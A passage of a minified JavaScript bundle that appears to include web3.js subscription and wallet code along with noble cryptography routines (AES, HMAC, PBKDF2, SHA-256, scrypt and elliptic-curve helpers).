            const o = ((n = t.params) === null || n === void 0 ? void 0 : n.subscription) || ((r = t.data) === null || r === void 0 ? void 0 : r.subscription) || ((i = t.id) === null || i === void 0 ? void 0 : i.toString(16));
            if (o) {
                const s = this._subscriptions.get(o);
                s == null || s.processSubscriptionData(t)
            }
        }
        subscribe(t, n, r = At) {
            return ra(this, void 0, void 0, function*() {
                const i = this.registeredSubscriptions[t];
                if (!i) throw new ar("Invalid subscription type");
                const o = new i(n ?? void 0, {
                    subscriptionManager: this,
                    returnFormat: r
                });
                return yield this.addSubscription(o), o
            })
        }
        get subscriptions() {
            return this._subscriptions
        }
        addSubscription(t) {
            return ra(this, void 0, void 0, function*() {
                if (!this.requestManager.provider) throw new Rc("Provider not available");
                if (!this.supportsSubscriptions()) throw new ar("The current provider does not support subscriptions");
                if (t.id && this._subscriptions.has(t.id)) throw new ar(`Subscription with id "${t.id}" already exists`);
                if (yield t.sendSubscriptionRequest(), X(t.id)) throw new ar("Subscription is not subscribed yet.");
                return this._subscriptions.set(t.id, t), t.id
            })
        }
        removeSubscription(t) {
            return ra(this, void 0, void 0, function*() {
                const {
                    id: n
                } = t;
                if (X(n)) throw new ar("Subscription is not subscribed yet. Or, had already been unsubscribed but not through the Subscription Manager.");
                if (!this._subscriptions.has(n) && !this.tolerateUnlinkedSubscription) throw new ar(`Subscription with id "${n.toString()}" does not exists`);
                return yield t.sendUnsubscribeRequest(), this._subscriptions.delete(n), n
            })
        }
        unsubscribe(t) {
            return ra(this, void 0, void 0, function*() {
                const n = [];
                for (const [r, i] of this.subscriptions.entries())(!t || typeof t == "function" && t({
                    id: r,
                    sub: i
                })) && n.push(this.removeSubscription(i));
                return Promise.all(n)
            })
        }
        clear() {
            this._subscriptions.clear()
        }
        supportsSubscriptions() {
            return X(this.requestManager.provider) ? !1 : ZN(this.requestManager.provider)
        }
    }
    var ia = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class Vl extends ef {
        constructor(t, n) {
            var r;
            super(), this.args = t;
            const {
                requestManager: i
            } = n, {
                subscriptionManager: o
            } = n;
            i ? this._subscriptionManager = new qu(i, {}, !0) : this._subscriptionManager = o, this._returnFormat = (r = n == null ? void 0 : n.returnFormat) !== null && r !== void 0 ? r : At
        }
        get id() {
            return this._id
        }
        get lastBlock() {
            return this._lastBlock
        }
        subscribe() {
            return ia(this, void 0, void 0, function*() {
                return this._subscriptionManager.addSubscription(this)
            })
        }
        processSubscriptionData(t) {
            var n, r;
            t != null && t.data ? this._processSubscriptionResult((r = (n = t == null ? void 0 : t.data) === null || n === void 0 ? void 0 : n.result) !== null && r !== void 0 ? r : t == null ? void 0 : t.data) : t && Xd(t) && this._processSubscriptionResult(t == null ? void 0 : t.params.result)
        }
        sendSubscriptionRequest() {
            return ia(this, void 0, void 0, function*() {
                return this._id = yield this._subscriptionManager.requestManager.send({
                    method: "eth_subscribe",
                    params: this._buildSubscriptionParams()
                }), this.emit("connected", this._id), this._id
            })
        }
        get returnFormat() {
            return this._returnFormat
        }
        get subscriptionManager() {
            return this._subscriptionManager
        }
        resubscribe() {
            return ia(this, void 0, void 0, function*() {
                yield this.unsubscribe(), yield this.subscribe()
            })
        }
        unsubscribe() {
            return ia(this, void 0, void 0, function*() {
                this.id && (yield this._subscriptionManager.removeSubscription(this))
            })
        }
        sendUnsubscribeRequest() {
            return ia(this, void 0, void 0, function*() {
                yield this._subscriptionManager.requestManager.send({
                    method: "eth_unsubscribe",
                    params: [this.id]
                }), this._id = void 0
            })
        }
        formatSubscriptionResult(t) {
            return t
        }
        _processSubscriptionResult(t) {
            this.emit("data", this.formatSubscriptionResult(t))
        }
        _processSubscriptionError(t) {
            this.emit("error", t)
        }
        _buildSubscriptionParams() {
            throw new Error("Implement in the child class")
        }
    }
    var Ao = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class Qu extends D5 {
        constructor() {
            super(...arguments), this._addressMap = new Map, this._defaultKeyName = "web3js_wallet"
        }
        static getStorage() {
            let t;
            try {
                t = window.localStorage;
                const n = "__storage_test__";
                return t.setItem(n, n), t.removeItem(n), t
            } catch (n) {
                return n && (n.code === 22 || n.code === 1014 || n.name === "QuotaExceededError" || n.name === "NS_ERROR_DOM_QUOTA_REACHED") && !N(t) && t.length !== 0 ? t : void 0
            }
        }
        create(t) {
            for (let n = 0; n < t; n += 1) this.add(this._accountProvider.create());
            return this
        }
        add(t) {
            var n;
            if (typeof t == "string") return this.add(this._accountProvider.privateKeyToAccount(t));
            let r = this.length;
            return this.get(t.address) && (console.warn(`Account ${t.address.toLowerCase()} already exists.`), r = (n = this._addressMap.get(t.address.toLowerCase())) !== null && n !== void 0 ? n : r), this._addressMap.set(t.address.toLowerCase(), r), this[r] = t, this
        }
        get(t) {
            if (typeof t == "string") {
                const n = this._addressMap.get(t.toLowerCase());
                return N(n) ? void 0 : this[n]
            }
            return this[t]
        }
        remove(t) {
            if (typeof t == "string") {
                const n = this._addressMap.get(t.toLowerCase());
                return N(n) ? !1 : (this._addressMap.delete(t.toLowerCase()), this.splice(n, 1), !0)
            }
            return this[t] ? (this.splice(t, 1), !0) : !1
        }
        clear() {
            return this._addressMap.clear(), this.length = 0, this
        }
        encrypt(t, n) {
            return Ao(this, void 0, void 0, function*() {
                return Promise.all(this.map(r => Ao(this, void 0, void 0, function*() {
                    return r.encrypt(t, n)
                })))
            })
        }
        decrypt(t, n, r) {
            return Ao(this, void 0, void 0, function*() {
                const i = yield Promise.all(t.map(o => Ao(this, void 0, void 0, function*() {
                    return this._accountProvider.decrypt(o, n, r)
                })));
                for (const o of i) this.add(o);
                return this
            })
        }
        save(t, n) {
            return Ao(this, void 0, void 0, function*() {
                const r = Qu.getStorage();
                if (!r) throw new Error("Local storage not available.");
                return r.setItem(n ?? this._defaultKeyName, JSON.stringify(yield this.encrypt(t))), !0
            })
        }
        load(t, n) {
            return Ao(this, void 0, void 0, function*() {
                const r = Qu.getStorage();
                if (!r) throw new Error("Local storage not available.");
                const i = r.getItem(n ?? this._defaultKeyName);
                return i && (yield this.decrypt(JSON.parse(i) || [], t)), this
            })
        }
    }
    const $n = {
        web: Nc
    };

    function WE(e, t, n) {
        if (!n.startsWith("aes-")) throw new Error(`AES submodule doesn't support mode ${n}`);
        if (t.length !== 16) throw new Error("AES: wrong IV length");
        if (n.startsWith("aes-128") && e.length !== 16 || n.startsWith("aes-256") && e.length !== 32) throw new Error("AES: wrong key length")
    }
    async function qE(e, t, n) {
        if (!$n.web) throw new Error("Browser crypto not available.");
        let r;
        if (["aes-128-cbc", "aes-256-cbc"].includes(e) && (r = "cbc"), ["aes-128-ctr", "aes-256-ctr"].includes(e) && (r = "ctr"), !r) throw new Error("AES: unsupported mode");
        return [await $n.web.subtle.importKey("raw", t, {
            name: `AES-${r.toUpperCase()}`,
            length: t.length * 8
        }, !0, ["encrypt", "decrypt"]), {
            name: `aes-${r}`,
            iv: n,
            counter: n,
            length: 128
        }]
    }
    async function z0(e, t, n, r = "aes-128-ctr", i = !0) {
        if (WE(t, n, r), $n.web) {
            const [o, s] = await qE(r, t, n), a = await $n.web.subtle.encrypt(s, o, e);
            let l = new Uint8Array(a);
            return !i && s.name === "aes-cbc" && !(e.length % 16) && (l = l.slice(0, -16)), l
        } else if ($n.node) {
            const o = $n.node.createCipheriv(r, t, n);
            return o.setAutoPadding(i), Ru(o.update(e), o.final())
        } else throw new Error("The environment doesn't have AES module")
    }
    async function YN(e, t, n, r) {
        const i = e.slice(-16);
        for (let s = 0; s < 16; s++) i[s] ^= n[s] ^ 16;
        return (await z0(i, t, n, r)).slice(0, 16)
    }
    async function JN(e, t, n, r = "aes-128-ctr", i = !0) {
        if (WE(t, n, r), $n.web) {
            const [o, s] = await qE(r, t, n);
            if (!i && s.name === "aes-cbc") {
                const u = await YN(e, t, n, r);
                e = Ru(e, u)
            }
            const a = await $n.web.subtle.decrypt(s, o, e),
                l = new Uint8Array(a);
            if (s.name === "aes-cbc") {
                const u = await z0(l, t, n, r);
                if (!KP(u, e)) throw new Error("AES: wrong padding")
            }
            return l
        } else if ($n.node) {
            const o = $n.node.createDecipheriv(r, t, n);
            return o.setAutoPadding(i), Ru(o.update(e), o.final())
        } else throw new Error("The environment doesn't have AES module")
    }
    class QE extends S0 {
        constructor(t, n) {
            super(), this.finished = !1, this.destroyed = !1, A0(t);
            const r = ps(n);
            if (this.iHash = t.create(), typeof this.iHash.update != "function") throw new Error("Expected instance of class which extends utils.Hash");
            this.blockLen = this.iHash.blockLen, this.outputLen = this.iHash.outputLen;
            const i = this.blockLen,
                o = new Uint8Array(i);
            o.set(r.length > i ? t.create().update(r).digest() : r);
            for (let s = 0; s < o.length; s++) o[s] ^= 54;
            this.iHash.update(o), this.oHash = t.create();
            for (let s = 0; s < o.length; s++) o[s] ^= 106;
            this.oHash.update(o), o.fill(0)
        }
        update(t) {
            return oo(this), this.iHash.update(t), this
        }
        digestInto(t) {
            oo(this), Hs(t, this.outputLen), this.finished = !0, this.iHash.digestInto(t), this.oHash.update(t), this.oHash.digestInto(t), this.destroy()
        }
        digest() {
            const t = new Uint8Array(this.oHash.outputLen);
            return this.digestInto(t), t
        }
        _cloneInto(t) {
            t || (t = Object.create(Object.getPrototypeOf(this), {}));
            const {
                oHash: n,
                iHash: r,
                finished: i,
                destroyed: o,
                blockLen: s,
                outputLen: a
            } = this;
            return t = t, t.finished = i, t.destroyed = o, t.blockLen = s, t.outputLen = a, t.oHash = n._cloneInto(t.oHash), t.iHash = r._cloneInto(t.iHash), t
        }
        destroy() {
            this.destroyed = !0, this.oHash.destroy(), this.iHash.destroy()
        }
    }
    const G0 = (e, t, n) => new QE(e, t).update(n).digest();
    G0.create = (e, t) => new QE(e, t);

    function XN(e, t, n, r) {
        A0(e);
        const i = Zx({
                dkLen: 32,
                asyncTick: 10
            }, r),
            {
                c: o,
                dkLen: s,
                asyncTick: a
            } = i;
        if (Nt(o), Nt(s), Nt(a), o < 1) throw new Error("PBKDF2: iterations (c) should be >= 1");
        const l = ps(t),
            u = ps(n),
            c = new Uint8Array(s),
            d = G0.create(e, l),
            f = d._cloneInto().update(u);
        return {
            c: o,
            dkLen: s,
            asyncTick: a,
            DK: c,
            PRF: d,
            PRFSalt: f
        }
    }

    function e6(e, t, n, r, i) {
        return e.destroy(), t.destroy(), r && r.destroy(), i.fill(0), n
    }

    function V0(e, t, n, r) {
        const {
            c: i,
            dkLen: o,
            DK: s,
            PRF: a,
            PRFSalt: l
        } = XN(e, t, n, r);
        let u;
        const c = new Uint8Array(4),
            d = Mc(c),
            f = new Uint8Array(a.outputLen);
        for (let h = 1, v = 0; v < o; h++, v += a.outputLen) {
            const p = s.subarray(v, v + a.outputLen);
            d.setInt32(0, h, !1), (u = l._cloneInto(u)).update(c).digestInto(f), p.set(f.subarray(0, p.length));
            for (let w = 1; w < i; w++) {
                a._cloneInto(u).update(f).digestInto(f);
                for (let m = 0; m < p.length; m++) p[m] ^= f[m]
            }
        }
        return e6(a, l, s, u, f)
    }

    function t6(e, t, n, r) {
        if (typeof e.setBigUint64 == "function") return e.setBigUint64(t, n, r);
        const i = BigInt(32),
            o = BigInt(4294967295),
            s = Number(n >> i & o),
            a = Number(n & o),
            l = r ? 4 : 0,
            u = r ? 0 : 4;
        e.setUint32(t + l, s, r), e.setUint32(t + u, a, r)
    }
    const n6 = (e, t, n) => e & t ^ ~e & n,
        r6 = (e, t, n) => e & t ^ e & n ^ t & n;
    class i6 extends S0 {
        constructor(t, n, r, i) {
            super(), this.blockLen = t, this.outputLen = n, this.padOffset = r, this.isLE = i, this.finished = !1, this.length = 0, this.pos = 0, this.destroyed = !1, this.buffer = new Uint8Array(t), this.view = Mc(this.buffer)
        }
        update(t) {
            oo(this);
            const {
                view: n,
                buffer: r,
                blockLen: i
            } = this;
            t = ps(t);
            const o = t.length;
            for (let s = 0; s < o;) {
                const a = Math.min(i - this.pos, o - s);
                if (a === i) {
                    const l = Mc(t);
                    for (; i <= o - s; s += i) this.process(l, s);
                    continue
                }
                r.set(t.subarray(s, s + a), this.pos), this.pos += a, s += a, this.pos === i && (this.process(n, 0), this.pos = 0)
            }
            return this.length += t.length, this.roundClean(), this
        }
        digestInto(t) {
            oo(this), _0(t, this), this.finished = !0;
            const {
                buffer: n,
                view: r,
                blockLen: i,
                isLE: o
            } = this;
            let {
                pos: s
            } = this;
            n[s++] = 128, this.buffer.subarray(s).fill(0), this.padOffset > i - s && (this.process(r, 0), s = 0);
            for (let d = s; d < i; d++) n[d] = 0;
            t6(r, i - 8, BigInt(this.length * 8), o), this.process(r, 0);
            const a = Mc(t),
                l = this.outputLen;
            if (l % 4) throw new Error("_sha2: outputLen should be aligned to 32bit");
            const u = l / 4,
                c = this.get();
            if (u > c.length) throw new Error("_sha2: outputLen bigger than state");
            for (let d = 0; d < u; d++) a.setUint32(4 * d, c[d], o)
        }
        digest() {
            const {
                buffer: t,
                outputLen: n
            } = this;
            this.digestInto(t);
            const r = t.slice(0, n);
            return this.destroy(), r
        }
        _cloneInto(t) {
            t || (t = new this.constructor), t.set(...this.get());
            const {
                blockLen: n,
                buffer: r,
                length: i,
                finished: o,
                destroyed: s,
                pos: a
            } = this;
            return t.length = i, t.pos = a, t.finished = o, t.destroyed = s, i % n && t.buffer.set(r), t
        }
    }
    const o6 = new Uint32Array([1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298]),
        Br = new Uint32Array([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225]),
        Mr = new Uint32Array(64);
    class s6 extends i6 {
        constructor() {
            super(64, 32, 8, !1), this.A = Br[0] | 0, this.B = Br[1] | 0, this.C = Br[2] | 0, this.D = Br[3] | 0, this.E = Br[4] | 0, this.F = Br[5] | 0, this.G = Br[6] | 0, this.H = Br[7] | 0
        }
        get() {
            const {
                A: t,
                B: n,
                C: r,
                D: i,
                E: o,
                F: s,
                G: a,
                H: l
            } = this;
            return [t, n, r, i, o, s, a, l]
        }
        set(t, n, r, i, o, s, a, l) {
            this.A = t | 0, this.B = n | 0, this.C = r | 0, this.D = i | 0, this.E = o | 0, this.F = s | 0, this.G = a | 0, this.H = l | 0
        }
        process(t, n) {
            for (let d = 0; d < 16; d++, n += 4) Mr[d] = t.getUint32(n, !1);
            for (let d = 16; d < 64; d++) {
                const f = Mr[d - 15],
                    h = Mr[d - 2],
                    v = Nn(f, 7) ^ Nn(f, 18) ^ f >>> 3,
                    p = Nn(h, 17) ^ Nn(h, 19) ^ h >>> 10;
                Mr[d] = p + Mr[d - 7] + v + Mr[d - 16] | 0
            }
            let {
                A: r,
                B: i,
                C: o,
                D: s,
                E: a,
                F: l,
                G: u,
                H: c
            } = this;
            for (let d = 0; d < 64; d++) {
                const f = Nn(a, 6) ^ Nn(a, 11) ^ Nn(a, 25),
                    h = c + f + n6(a, l, u) + o6[d] + Mr[d] | 0,
                    p = (Nn(r, 2) ^ Nn(r, 13) ^ Nn(r, 22)) + r6(r, i, o) | 0;
                c = u, u = l, l = a, a = s + h | 0, s = o, o = i, i = r, r = h + p | 0
            }
            r = r + this.A | 0, i = i + this.B | 0, o = o + this.C | 0, s = s + this.D | 0, a = a + this.E | 0, l = l + this.F | 0, u = u + this.G | 0, c = c + this.H | 0, this.set(r, i, o, s, a, l, u, c)
        }
        roundClean() {
            Mr.fill(0)
        }
        destroy() {
            this.set(0, 0, 0, 0, 0, 0, 0, 0), this.buffer.fill(0)
        }
    }
    const nf = Yx(() => new s6);

    function KE(e, t, n, r, i) {
        if (!["sha256", "sha512"].includes(i)) throw new Error("Only sha256 and sha512 are supported");
        return Nu(e), Nu(t), V0(nf, e, t, {
            c: n,
            dkLen: r
        })
    }

    function Py(e, t, n, r, i, o) {
        let s = e[t++] ^ n[r++],
            a = e[t++] ^ n[r++],
            l = e[t++] ^ n[r++],
            u = e[t++] ^ n[r++],
            c = e[t++] ^ n[r++],
            d = e[t++] ^ n[r++],
            f = e[t++] ^ n[r++],
            h = e[t++] ^ n[r++],
            v = e[t++] ^ n[r++],
            p = e[t++] ^ n[r++],
            w = e[t++] ^ n[r++],
            m = e[t++] ^ n[r++],
            g = e[t++] ^ n[r++],
            y = e[t++] ^ n[r++],
            x = e[t++] ^ n[r++],
            E = e[t++] ^ n[r++],
            k = s,
            I = a,
            _ = l,
            L = u,
            C = c,
            M = d,
            F = f,
            U = h,
            Q = v,
            A = p,
            P = w,
            O = m,
            T = g,
            B = y,
            R = x,
            $ = E;
        for (let Z = 0; Z < 8; Z += 2) C ^= ge(k + T | 0, 7), Q ^= ge(C + k | 0, 9), T ^= ge(Q + C | 0, 13), k ^= ge(T + Q | 0, 18), A ^= ge(M + I | 0, 7), B ^= ge(A + M | 0, 9), I ^= ge(B + A | 0, 13), M ^= ge(I + B | 0, 18), R ^= ge(P + F | 0, 7), _ ^= ge(R + P | 0, 9), F ^= ge(_ + R | 0, 13), P ^= ge(F + _ | 0, 18), L ^= ge($ + O | 0, 7), U ^= ge(L + $ | 0, 9), O ^= ge(U + L | 0, 13), $ ^= ge(O + U | 0, 18), I ^= ge(k + L | 0, 7), _ ^= ge(I + k | 0, 9), L ^= ge(_ + I | 0, 13), k ^= ge(L + _ | 0, 18), F ^= ge(M + C | 0, 7), U ^= ge(F + M | 0, 9), C ^= ge(U + F | 0, 13), M ^= ge(C + U | 0, 18), O ^= ge(P + A | 0, 7), Q ^= ge(O + P | 0, 9), A ^= ge(Q + O | 0, 13), P ^= ge(A + Q | 0, 18), T ^= ge($ + R | 0, 7), B ^= ge(T + $ | 0, 9), R ^= ge(B + T | 0, 13), $ ^= ge(R + B | 0, 18);
        i[o++] = s + k | 0, i[o++] = a + I | 0, i[o++] = l + _ | 0, i[o++] = u + L | 0, i[o++] = c + C | 0, i[o++] = d + M | 0, i[o++] = f + F | 0, i[o++] = h + U | 0, i[o++] = v + Q | 0, i[o++] = p + A | 0, i[o++] = w + P | 0, i[o++] = m + O | 0, i[o++] = g + T | 0, i[o++] = y + B | 0, i[o++] = x + R | 0, i[o++] = E + $ | 0
    }

    function nh(e, t, n, r, i) {
        let o = r + 0,
            s = r + 16 * i;
        for (let a = 0; a < 16; a++) n[s + a] = e[t + (2 * i - 1) * 16 + a];
        for (let a = 0; a < i; a++, o += 16, t += 16) Py(n, s, e, t, n, o), a > 0 && (s += 16), Py(n, o, e, t += 16, n, s)
    }

    function a6(e, t, n) {
        const r = Zx({
                dkLen: 32,
                asyncTick: 10,
                maxmem: 1073742848
            }, n),
            {
                N: i,
                r: o,
                p: s,
                dkLen: a,
                asyncTick: l,
                maxmem: u,
                onProgress: c
            } = r;
        if (Nt(i), Nt(o), Nt(s), Nt(a), Nt(l), Nt(u), c !== void 0 && typeof c != "function") throw new Error("progressCb should be function");
        const d = 128 * o,
            f = d / 4;
        if (i <= 1 || i & i - 1 || i >= 2 ** (d / 8) || i > 2 ** 32) throw new Error("Scrypt: N must be larger than 1, a power of 2, less than 2^(128 * r / 8) and less than 2^32");
        if (s < 0 || s > (2 ** 32 - 1) * 32 / d) throw new Error("Scrypt: p must be a positive integer less than or equal to ((2^32 - 1) * 32) / (128 * r)");
        if (a < 0 || a > (2 ** 32 - 1) * 32) throw new Error("Scrypt: dkLen should be positive integer less than or equal to (2^32 - 1) * 32");
        const h = d * (i + s);
        if (h > u) throw new Error(`Scrypt: parameters too large, ${h} (128 * r * (N + p)) > ${u} (maxmem)`);
        const v = V0(nf, e, t, {
                c: 1,
                dkLen: d * s
            }),
            p = Bc(v),
            w = Bc(new Uint8Array(d * i)),
            m = Bc(new Uint8Array(d));
        let g = () => {};
        if (c) {
            const y = 2 * i * s,
                x = Math.max(Math.floor(y / 1e4), 1);
            let E = 0;
            g = () => {
                E++, c && (!(E % x) || E === y) && c(E / y)
            }
        }
        return {
            N: i,
            r: o,
            p: s,
            dkLen: a,
            blockSize32: f,
            V: w,
            B32: p,
            B: v,
            tmp: m,
            blockMixCb: g,
            asyncTick: l
        }
    }

    function l6(e, t, n, r, i) {
        const o = V0(nf, e, n, {
            c: 1,
            dkLen: t
        });
        return n.fill(0), r.fill(0), i.fill(0), o
    }

    function c6(e, t, n) {
        const {
            N: r,
            r: i,
            p: o,
            dkLen: s,
            blockSize32: a,
            V: l,
            B32: u,
            B: c,
            tmp: d,
            blockMixCb: f
        } = a6(e, t, n);
        Cu || Pu(u);
        for (let h = 0; h < o; h++) {
            const v = a * h;
            for (let p = 0; p < a; p++) l[p] = u[v + p];
            for (let p = 0, w = 0; p < r - 1; p++) nh(l, w, l, w += a, i), f();
            nh(l, (r - 1) * a, u, v, i), f();
            for (let p = 0; p < r; p++) {
                const w = u[v + a - 16] % r;
                for (let m = 0; m < a; m++) d[m] = u[v + m] ^ l[w * a + m];
                nh(d, 0, u, v, i), f()
            }
        }
        return Cu || Pu(u), l6(e, s, c, l, d)
    }

    function ZE(e, t, n, r, i, o, s) {
        return Nu(e), Nu(t), c6(e, t, {
            N: n,
            r: i,
            p: r,
            dkLen: o,
            onProgress: s
        })
    } /*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
    const YE = BigInt(0),
        rf = BigInt(1),
        u6 = BigInt(2);

    function ho(e) {
        return e instanceof Uint8Array || e != null && typeof e == "object" && e.constructor.name === "Uint8Array"
    }

    function Wl(e) {
        if (!ho(e)) throw new Error("Uint8Array expected")
    }
    const d6 = Array.from({
        length: 256
    }, (e, t) => t.toString(16).padStart(2, "0"));

    function As(e) {
        Wl(e);
        let t = "";
        for (let n = 0; n < e.length; n++) t += d6[e[n]];
        return t
    }

    function JE(e) {
        const t = e.toString(16);
        return t.length & 1 ? `0${t}` : t
    }

    function W0(e) {
        if (typeof e != "string") throw new Error("hex string expected, got " + typeof e);
        return BigInt(e === "" ? "0" : `0x${e}`)
    }
    const nr = {
        _0: 48,
        _9: 57,
        _A: 65,
        _F: 70,
        _a: 97,
        _f: 102
    };

    function Ry(e) {
        if (e >= nr._0 && e <= nr._9) return e - nr._0;
        if (e >= nr._A && e <= nr._F) return e - (nr._A - 10);
        if (e >= nr._a && e <= nr._f) return e - (nr._a - 10)
    }

    function _s(e) {
        if (typeof e != "string") throw new Error("hex string expected, got " + typeof e);
        const t = e.length,
            n = t / 2;
        if (t % 2) throw new Error("padded hex string expected, got unpadded hex of length " + t);
        const r = new Uint8Array(n);
        for (let i = 0, o = 0; i < n; i++, o += 2) {
            const s = Ry(e.charCodeAt(o)),
                a = Ry(e.charCodeAt(o + 1));
            if (s === void 0 || a === void 0) {
                const l = e[o] + e[o + 1];
                throw new Error('hex string expected, got non-hex character "' + l + '" at index ' + o)
            }
            r[i] = s * 16 + a
        }
        return r
    }

    function qi(e) {
        return W0(As(e))
    }

    function q0(e) {
        return Wl(e), W0(As(Uint8Array.from(e).reverse()))
    }

    function Ss(e, t) {
        return _s(e.toString(16).padStart(t * 2, "0"))
    }

    function Q0(e, t) {
        return Ss(e, t).reverse()
    }

    function f6(e) {
        return _s(JE(e))
    }

    function yn(e, t, n) {
        let r;
        if (typeof t == "string") try {
                r = _s(t)
            } catch (o) {
                throw new Error(`${e} must be valid hex string, got "${t}". Cause: ${o}`)
            } else if (ho(t)) r = Uint8Array.from(t);
            else throw new Error(`${e} must be hex string or Uint8Array`);
        const i = r.length;
        if (typeof n == "number" && i !== n) throw new Error(`${e} expected ${n} bytes, got ${i}`);
        return r
    }

    function bl(...e) {
        let t = 0;
        for (let r = 0; r < e.length; r++) {
            const i = e[r];
            Wl(i), t += i.length
        }
        const n = new Uint8Array(t);
        for (let r = 0, i = 0; r < e.length; r++) {
            const o = e[r];
            n.set(o, i), i += o.length
        }
        return n
    }

    function h6(e, t) {
        if (e.length !== t.length) return !1;
        let n = 0;
        for (let r = 0; r < e.length; r++) n |= e[r] ^ t[r];
        return n === 0
    }

    function p6(e) {
        if (typeof e != "string") throw new Error(`utf8ToBytes expected string, got ${typeof e}`);
        return new Uint8Array(new TextEncoder().encode(e))
    }

    function m6(e) {
        let t;
        for (t = 0; e > YE; e >>= rf, t += 1);
        return t
    }

    function g6(e, t) {
        return e >> BigInt(t) & rf
    }

    function v6(e, t, n) {
        return e | (n ? rf : YE) << BigInt(t)
    }
    const K0 = e => (u6 << BigInt(e - 1)) - rf,
        rh = e => new Uint8Array(e),
        Ny = e => Uint8Array.from(e);

    function XE(e, t, n) {
        if (typeof e != "number" || e < 2) throw new Error("hashLen must be a number");
        if (typeof t != "number" || t < 2) throw new Error("qByteLen must be a number");
        if (typeof n != "function") throw new Error("hmacFn must be a function");
        let r = rh(e),
            i = rh(e),
            o = 0;
        const s = () => {
                r.fill(1), i.fill(0), o = 0
            },
            a = (...d) => n(i, r, ...d),
            l = (d = rh()) => {
                i = a(Ny([0]), d), r = a(), d.length !== 0 && (i = a(Ny([1]), d), r = a())
            },
            u = () => {
                if (o++ >= 1e3) throw new Error("drbg: tried 1000 values");
                let d = 0;
                const f = [];
                for (; d < t;) {
                    r = a();
                    const h = r.slice();
                    f.push(h), d += r.length
                }
                return bl(...f)
            };
        return (d, f) => {
            s(), l(d);
            let h;
            for (; !(h = f(u()));) l();
            return s(), h
        }
    }
    const y6 = {
        bigint: e => typeof e == "bigint",
        function: e => typeof e == "function",
        boolean: e => typeof e == "boolean",
        string: e => typeof e == "string",
        stringOrUint8Array: e => typeof e == "string" || ho(e),
        isSafeInteger: e => Number.isSafeInteger(e),
        array: e => Array.isArray(e),
        field: (e, t) => t.Fp.isValid(e),
        hash: e => typeof e == "function" && Number.isSafeInteger(e.outputLen)
    };

    function ql(e, t, n = {}) {
        const r = (i, o, s) => {
            const a = y6[o];
            if (typeof a != "function") throw new Error(`Invalid validator "${o}", expected function`);
            const l = e[i];
            if (!(s && l === void 0) && !a(l, e)) throw new Error(`Invalid param ${String(i)}=${l} (${typeof l}), expected ${o}`)
        };
        for (const [i, o] of Object.entries(t)) r(i, o, !1);
        for (const [i, o] of Object.entries(n)) r(i, o, !0);
        return e
    }
    const w6 = Object.freeze(Object.defineProperty({
        __proto__: null,
        abytes: Wl,
        bitGet: g6,
        bitLen: m6,
        bitMask: K0,
        bitSet: v6,
        bytesToHex: As,
        bytesToNumberBE: qi,
        bytesToNumberLE: q0,
        concatBytes: bl,
        createHmacDrbg: XE,
        ensureBytes: yn,
        equalBytes: h6,
        hexToBytes: _s,
        hexToNumber: W0,
        isBytes: ho,
        numberToBytesBE: Ss,
        numberToBytesLE: Q0,
        numberToHexUnpadded: JE,
        numberToVarBytesBE: f6,
        utf8ToBytes: p6,
        validateObject: ql
    }, Symbol.toStringTag, {
        value: "Module"
    })); /*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
    const Xe = BigInt(0),
        Ue = BigInt(1),
        Ii = BigInt(2),
        b6 = BigInt(3),
        Bp = BigInt(4),
        By = BigInt(5),
        My = BigInt(8);
    BigInt(9);
    BigInt(16);

    function Pt(e, t) {
        const n = e % t;
        return n >= Xe ? n : t + n
    }

    function x6(e, t, n) {
        if (n <= Xe || t < Xe) throw new Error("Expected power/modulo > 0");
        if (n === Ue) return Xe;
        let r = Ue;
        for (; t > Xe;) t & Ue && (r = r * e % n), e = e * e % n, t >>= Ue;
        return r
    }

    function tn(e, t, n) {
        let r = e;
        for (; t-- > Xe;) r *= r, r %= n;
        return r
    }

    function Mp(e, t) {
        if (e === Xe || t <= Xe) throw new Error(`invert: expected positive integers, got n=${e} mod=${t}`);
        let n = Pt(e, t),
            r = t,
            i = Xe,
            o = Ue;
        for (; n !== Xe;) {
            const a = r / n,
                l = r % n,
                u = i - o * a;
            r = n, n = l, i = o, o = u
        }
        if (r !== Ue) throw new Error("invert: does not exist");
        return Pt(i, t)
    }

    function E6(e) {
        const t = (e - Ue) / Ii;
        let n, r, i;
        for (n = e - Ue, r = 0; n % Ii === Xe; n /= Ii, r++);
        for (i = Ii; i < e && x6(i, t, e) !== e - Ue; i++);
        if (r === 1) {
            const s = (e + Ue) / Bp;
            return function(l, u) {
                const c = l.pow(u, s);
                if (!l.eql(l.sqr(c), u)) throw new Error("Cannot find square root");
                return c
            }
        }
        const o = (n + Ue) / Ii;
        return function(a, l) {
            if (a.pow(l, t) === a.neg(a.ONE)) throw new Error("Cannot find square root");
            let u = r,
                c = a.pow(a.mul(a.ONE, i), n),
                d = a.pow(l, o),
